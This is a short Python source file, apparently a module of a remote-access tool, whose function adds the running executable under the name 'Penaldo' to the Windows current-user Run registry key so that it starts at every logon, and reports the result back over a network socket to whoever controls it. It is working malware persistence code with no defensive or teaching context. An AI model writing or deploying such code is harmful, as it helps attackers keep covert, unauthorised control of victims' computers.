import os
import sys
import time
import winreg as reg

def add_to_registry(sock):
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    app_name = 'Penaldo'
    exe_path = os.path.abspath(sys.executable)
    exe_path_quoted = f'"{exe_path}"' if ' ' in exe_path else exe_path
    
    while True:
        try:
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as registry_key:
                reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, exe_path_quoted)
                response = f"Added or updated {app_name} to Registry with path: {exe_path_quoted}\n"
                time.sleep(1)
                sock.sendall(response.encode())
                break
        except Exception as e:
            error_msg = f"Error adding to Registry: {e}\n"
            sock.sendall(error_msg.encode())
